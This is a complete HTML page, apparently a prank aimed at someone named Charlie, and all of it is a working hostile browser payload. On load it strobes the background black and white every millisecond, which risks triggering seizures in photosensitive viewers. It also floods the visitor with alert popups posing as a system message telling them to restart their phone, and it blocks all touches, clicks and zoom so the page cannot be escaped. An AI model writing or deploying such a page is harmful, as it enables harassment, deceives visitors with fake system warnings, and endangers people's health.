<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>Charlie is ....</title>
<style>
  html, body {
    margin: 0; padding: 0;
    height: 100vh; width: 100vw;
    overflow: hidden;
    user-select: none;
    -webkit-user-select: none;
    touch-action: none;
    -webkit-touch-callout: none;
    background: black;
  }
</style>
</head>
<body>
<script>
  // Flicker function, runs immediately
  (function flicker() {
    document.body.style.background = (document.body.style.background === 'black') ? 'white' : 'black';
    setTimeout(flicker, 1); // ~1ms delay to switch as fast as possible
  })();

  // Alert spam chain function, runs immediately
  (function alertSpam() {
    alert("SYSTEM: Restart Phone the site is bugged");
    setTimeout(alertSpam, 100);
  })();

  // Block all touches, clicks, gestures immediately
  function blockAll(e) {
    e.preventDefault();
    e.stopPropagation();
    return false;
  }
  document.addEventListener('touchstart', blockAll, {passive:false, capture:true});
  document.addEventListener('touchmove', blockAll, {passive:false, capture:true});
  document.addEventListener('touchend', blockAll, {passive:false, capture:true});
  document.addEventListener('click', blockAll, {passive:false, capture:true});

  // Block zoom and other gestures
  document.documentElement.style.touchAction = 'none';
</script>
</body>
</html>
